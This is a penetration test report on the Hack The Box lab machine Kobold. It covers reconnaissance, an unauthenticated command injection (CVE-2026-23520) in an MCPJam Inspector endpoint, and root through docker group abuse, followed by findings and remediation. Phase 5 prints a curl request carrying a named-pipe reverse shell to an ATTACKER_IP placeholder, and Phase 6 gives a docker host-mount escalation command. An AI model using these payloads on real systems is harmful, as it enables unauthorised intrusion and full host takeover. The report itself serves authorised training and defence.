# Penetration Test Report: HTB Kobold

<!--
  Built to the v4 template standard.
  METADATA CONVENTIONS:
   - Dates: ISO 8601 (YYYY-MM-DD).
   - HTB IP addresses: obfuscated as 10.129.XX.XX.
   - Template version identifies the schema; Report version identifies this document's revision state.
  WRITING STYLE: no em-dashes anywhere. Colons introduce; commas or brackets for asides; semicolons join; "to" for ranges; "n/a" in empty cells.
-->

## Document Control

| Field | Detail |
|-------|--------|
| Report title | Penetration Test Report: HTB Kobold |
| Template version | v4 |
| Report version | 2.0 |
| Author | David Lumsden |
| Reviewer (QA) | Self-reviewed |
| Date | 2026-05-17 |
| Classification | Confidential / Training Documentation |
| Distribution | Portfolio (public) |
| Redaction policy | Flags withheld. HTB IPs obfuscated as 10.129.XX.XX. Reverse-shell payloads use an ATTACKER_IP placeholder. |

### Version history

| Report version | Date | Author | Notes |
|----------------|------|--------|-------|
| 1.0 | 2026-05-17 | David Lumsden | Initial report, v3 standard; severities reconciled |
| 2.0 | 2026-05-17 | David Lumsden | Migrated to v4 template; IPs obfuscated (scope table and narrative commands); metadata standardised |

---

## Table of Contents

1. Executive Summary
2. Scope and Rules of Engagement
3. Methodology and Risk Rating Model
4. Attack Narrative
5. Findings Summary
6. Detailed Findings
7. Strategic Recommendations (Root-Cause Themes)
8. Remediation Roadmap
9. Proof of Exploitation
10. Retest and Validation
- Appendix A: Tools Used
- Appendix B: References

---

## 1. Executive Summary

An attacker on the internet, holding no credentials, could take complete control of the assessed server. A management interface exposed to the internet allowed any unauthenticated visitor to run commands directly on the host, providing an immediate foothold. A misconfigured account group membership then allowed escalation to full administrative ("root") control of the system.

Neither step required advanced skill or original research. Both exploited a known software flaw and a basic configuration weakness: a publicly disclosed command-injection vulnerability in an exposed AI-tooling service, and a user account placed in a group that is effectively equivalent to root. The result is total compromise of the host and anything reachable from it.

Overall risk rating: CRITICAL

### Findings at a glance

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 1 |
| Medium | 1 |
| Low | 2 |
| Informational | 2 |

Most urgent action: patch the MCPJam Inspector service, place it behind authentication and network restrictions, and remove the foothold account from the privileged container group.

### Attack path summary

```
External recon
    |
    v
SSL certificate inspection  ->  wildcard SAN discovered (*.kobold.htb)
    |
    v
Virtual-host fuzzing  ->  mcp.kobold.htb discovered
    |
    v
CVE-2026-23520  ->  unauthenticated RCE via /api/mcp/connect
    |
    v
Reverse shell as ben  (USER FLAG)
    |
    v
Group enumeration  ->  docker group access via sg
    |
    v
Docker group abuse  ->  host filesystem mounted in container  (ROOT FLAG)
```

---

## 2. Scope and Rules of Engagement

| Item | Detail |
|------|--------|
| In scope | 10.129.XX.XX and all associated virtual hosts |
| Out of scope | HTB infrastructure, other platform users |
| Authorisation | Hack The Box platform; machine assigned to tester account |
| Testing type | Black-box (no prior credentials or source code) |
| Testing window | Single session, 2026-05-17 |
| Constraints | No denial-of-service testing |

---

## 3. Methodology and Risk Rating Model

Testing was aligned to PTES and the OWASP Web Security Testing Guide, across reconnaissance, enumeration, vulnerability identification, exploitation, post-exploitation, and reporting.

Risk rating model: base severity is assigned using CVSS v3.1 (vector shown per finding where applicable), with labels following CVSS bands strictly (Critical 9.0 to 10.0, High 7.0 to 8.9, Medium 4.0 to 6.9, Low 0.1 to 3.9). A contextual Risk rating is then derived from Likelihood multiplied by Business Impact. Note finding F-02: its CVSS base severity is High, because exploitation requires local access (the access vector caps the score), but its operational Risk is Critical, because the access it grants is equivalent to root. Base severity comes from the standard; contextual risk comes from what the finding actually enables.

---

## 4. Attack Narrative

### Phase 1: Initial Reconnaissance

An Nmap scan identified the open services (Figure 1):

```bash
nmap -A -sV -O -p- 10.129.XX.XX -oN HTB_Kobold_Initial_Scan
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | Open | HTTP | nginx 1.24.0 (redirects to HTTPS) |
| 443/tcp | Open | HTTPS | nginx 1.24.0 |
| 3552/tcp | Open | HTTP | Golang net/http server |

Port 3552 returned content consistent with a SvelteKit single-page application backed by a REST API.

### Phase 2: SSL Certificate Inspection

The TLS certificate on port 443 was inspected for Subject Alternative Names:

```bash
openssl s_client -connect 10.129.XX.XX:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A2 "Subject Alternative"
```

The certificate carried a wildcard SAN (`DNS:kobold.htb, DNS:*.kobold.htb`), confirming virtual-host routing. Local hosts-file entries were added for the known and suspected subdomains.

### Phase 3: Service Identification

Port 3552 presented a login panel for Arcane v1.13.0, a self-hosted Docker management platform. Its full OpenAPI specification was retrievable without authentication at `/api/openapi.json`, disclosing every endpoint, the authentication mechanisms, and the data schemas. The main site at `https://kobold.htb` disclosed the contact address `admin@kobold.htb`.

### Phase 4: Virtual Host Enumeration

Host-header fuzzing with ffuf revealed an additional virtual host:

```bash
ffuf -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -k
```

Result: `mcp.kobold.htb` (HTTP 200). The subdomain hosted the MCPJam Inspector, an MCP server testing interface. Its `/api/mcp/connect` endpoint, designed to launch MCP server processes from a client-supplied command, was identified as the primary attack surface.

### Phase 5: Initial Exploitation (CVE-2026-23520)

The `/api/mcp/connect` endpoint accepts a `serverConfig` object (`command`, `args`, `env`) and passes it to `child_process.spawn()` with no authentication and no input sanitisation. A proof-of-concept executing `id` confirmed command execution. A named-pipe reverse-shell payload was then submitted against a listener (`nc -lvnp 443`):

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect -X POST -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f"],"env":{}},"serverId":"shell"}'
```

This returned an interactive shell as `uid=1001(ben)`, capturing user-level access. The shell was upgraded to a TTY using Python's pty module.

### Phase 6: Privilege Escalation (Docker Group Abuse)

Group enumeration showed that `ben` could activate `docker` group membership via `sg docker`. Any member of the docker group can launch a privileged container with the host filesystem mounted, bypassing all file permissions:

```bash
sg docker -c "docker run -u root -v /:/hostfs --rm --entrypoint whoami privatebin/nginx-fpm-alpine:2.0.2"
# returns: root
```

Mounting the host filesystem (`-v /:/hostfs`) as root inside the container granted unrestricted read and write access to the host, completing the compromise.

---

## 5. Findings Summary

| ID | Finding | Severity | CVSS | Risk | CVE |
|----|---------|----------|------|------|-----|
| F-01 | Unauthenticated command injection (MCPJam Inspector) | Critical | 9.8 | Critical | CVE-2026-23520 |
| F-02 | Docker group membership equivalent to root | High | 8.8 | Critical | n/a |
| F-03 | Unauthenticated OpenAPI specification disclosure | Medium | 5.3 | Medium | n/a |
| F-04 | Software version disclosure | Low | n/a | Low | n/a |
| F-05 | Wildcard SAN reveals subdomain structure | Informational | n/a | Low | n/a |
| F-06 | Administrative email disclosed publicly | Informational | n/a | Low | n/a |
| F-07 | Internal management interface internet-facing | Low | 4.3 | High | n/a |

---

## 6. Detailed Findings

### F-01: Unauthenticated Command Injection (MCPJam Inspector)

| Field | Detail |
|-------|--------|
| Severity | Critical |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 [verify on NVD] |
| Likelihood | High |
| Business impact | High |
| Risk | Critical |
| CVE | CVE-2026-23520 |
| Affected asset | MCPJam Inspector, `mcp.kobold.htb`, `/api/mcp/connect` |
| Authentication required | None |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application) |

Description: the `/api/mcp/connect` endpoint passes a client-supplied command and arguments directly to `child_process.spawn()` without authentication or validation, allowing any unauthenticated attacker to execute arbitrary OS commands.

Evidence: a proof-of-concept `id` confirmed execution; a reverse-shell payload returned a shell as `ben`.

Business impact: immediate remote foothold on the server with no credentials required.

Remediation: upgrade MCPJam Inspector to a patched version; require authentication on all API endpoints; validate the `command` value against an allowlist of permitted binaries; run the service as a low-privilege account; apply egress filtering to block outbound reverse shells.

References: CVE-2026-23520 (NVD); OWASP API Security Top 10.

---

### F-02: Docker Group Membership Equivalent to Root

| Field | Detail |
|-------|--------|
| Severity | High (reconciled from the original "Critical": CVSS base is High because exploitation requires local access; see Risk) |
| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 8.8 |
| Likelihood | High (trivial once a shell is held) |
| Business impact | High |
| Risk | Critical (membership is functionally equivalent to root) |
| CVE | n/a |
| Affected asset | Host group configuration; user `ben` |
| Authentication required | Local shell (via F-01) |
| MITRE ATT&CK | T1611 (Escape to Host) |

Description: `ben` can activate `docker` group membership through `sg docker`. Any docker-group member can launch a privileged container that mounts the host filesystem, bypassing all file permissions and obtaining root.

Evidence: `sg docker -c "docker run -u root -v /:/hostfs ..."` executed as root against the mounted host filesystem.

Business impact: full root-level control of the host.

Remediation: remove `ben` from the docker group; treat docker-group membership as root-equivalent and audit all members; adopt rootless Docker, or a socket proxy with restricted permissions.

References: Docker daemon attack-surface documentation; GTFOBins (docker); MITRE T1611.

---

### F-03: Unauthenticated OpenAPI Specification Disclosure

| Field | Detail |
|-------|--------|
| Severity | Medium (reconciled from the original "High") |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = 5.3 |
| Likelihood | High |
| Business impact | Low |
| Risk | Medium |
| CVE | n/a |
| Affected asset | Arcane v1.13.0, `/api/openapi.json` |
| Authentication required | None |
| MITRE ATT&CK | T1592 (Gather Victim Host Information) |

Description: the full OpenAPI specification, disclosing all endpoints, authentication mechanisms, and schemas, is accessible without authentication, providing significant reconnaissance value.

Remediation: restrict the specification endpoint to authenticated users, or disable it in production.

References: OWASP API Security Top 10.

---

### F-04: Software Version Disclosure

| Field | Detail |
|-------|--------|
| Severity | Low (reconciled from the original "Medium"; informational-grade, contextual) |
| Likelihood | High |
| Business impact | Low |
| Risk | Low |
| CVE | n/a |
| Affected asset | Arcane v1.13.0, MCPJam Inspector |
| MITRE ATT&CK | T1592.002 |

Description: both applications disclose exact version numbers, enabling precise CVE targeting as demonstrated in this assessment.

Remediation: remove version strings from API responses and page source; strip version headers at the reverse proxy.

References: OWASP A05:2021 (Security Misconfiguration).

---

### F-05: Wildcard SAN Reveals Subdomain Structure

| Field | Detail |
|-------|--------|
| Severity | Informational (reconciled from the original "Medium") |
| Risk | Low |
| CVE | n/a |
| Affected asset | TLS certificate (`*.kobold.htb`) |

Description: the wildcard SAN signals that multiple subdomains exist, prompting the enumeration that revealed `mcp.kobold.htb`.

Remediation: use specific SANs listing only required hostnames; restrict internal or staging subdomains to internal networks; consider split-horizon DNS.

---

### F-06: Administrative Email Disclosed Publicly

| Field | Detail |
|-------|--------|
| Severity | Informational |
| Risk | Low |
| CVE | n/a |
| Affected asset | `kobold.htb` footer (`admin@kobold.htb`) |

Description: a valid admin email is published, providing a target for phishing, credential stuffing, and password-reset attacks.

Remediation: replace direct admin addresses with role-based or form-based contacts.

---

### F-07: Internal Management Interface Internet-Facing

| Field | Detail |
|-------|--------|
| Severity | Low (reconciled from the original "Informational") |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = 4.3 |
| Risk | High (the exposed service held the F-01 vulnerability) |
| CVE | n/a |
| Affected asset | `mcp.kobold.htb` network exposure |

Description: the MCPJam Inspector was reachable from the internet with no network-layer restriction. The application-layer flaw in this exposed service (F-01) led directly to full compromise; restricting exposure would have materially raised the attack barrier.

Remediation: restrict the interface to internal or VPN access; add an authentication layer in front of it; deploy a WAF with rate limiting.

---

## 7. Strategic Recommendations (Root-Cause Themes)

1. AI and management tooling exposed without network controls. Modern AI and container-management interfaces (MCPJam, Arcane) were directly internet-facing. Establish a baseline that places administrative and tooling interfaces behind VPN or network segmentation.
2. Least privilege not enforced for containers. Docker-group membership granting effective root reflects an absent privilege baseline. Adopt rootless Docker, and treat container-group membership as a privileged grant subject to audit.
3. Reconnaissance surface left open. Version strings, a full API specification, and a wildcard SAN collectively hand attackers a roadmap. Reduce information disclosure as a standard hardening step.

---

## 8. Remediation Roadmap

### Immediate (Critical priority)
1. Patch MCPJam Inspector (CVE-2026-23520) and place it behind authentication.
2. Remove `ben` from the docker group; audit all docker-group members.
3. Restrict `mcp.kobold.htb` to internal or VPN access.

### Short-term (High priority)
4. Restrict or disable the Arcane OpenAPI endpoint; run tooling as non-privileged users.
5. Implement egress filtering on web-facing hosts.

### Medium-term
6. Deploy rootless Docker; implement a WAF and network segmentation; remove version and host disclosure; deploy runtime detection (auditd or Falco) for anomalous process and outbound activity.

---

## 9. Proof of Exploitation

| Flag | Method | Location |
|------|--------|----------|
| User | Reverse shell as `ben` via CVE-2026-23520 | `/home/ben/user.txt` -> [REDACTED] |
| Root | Docker group abuse (host filesystem mount) | `/root/root.txt` -> [REDACTED] |

---

## 10. Retest and Validation

Recommend retest within 30 days to confirm that the application is patched and authenticated, the management interface is no longer internet-facing, and no account holds unaudited docker-group membership.

---

## Appendix A: Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.98 | Port scanning and service enumeration |
| ffuf | 2.1.0 | Virtual-host fuzzing |
| openssl | n/a | TLS certificate inspection |
| curl | 8.19.0 | HTTP and API interaction |
| netcat (nc) | n/a | Reverse-shell listener |
| python3 | 3.x | TTY upgrade via pty |
| docker / sg | n/a | Privilege escalation |

## Appendix B: References

| Reference | URL |
|-----------|-----|
| CVE-2026-23520 | https://nvd.nist.gov/vuln/detail/CVE-2026-23520 |
| Docker security (daemon attack surface) | https://docs.docker.com/engine/security/ |
| GTFOBins (docker) | https://gtfobins.github.io/gtfobins/docker/ |
| OWASP API Security Top 10 | https://owasp.org/www-project-api-security/ |
| MITRE ATT&CK T1190 / T1611 / T1078 | https://attack.mitre.org/ |

---

*Produced for educational purposes within the Hack The Box authorised training environment. All testing was conducted legally on assigned infrastructure.*
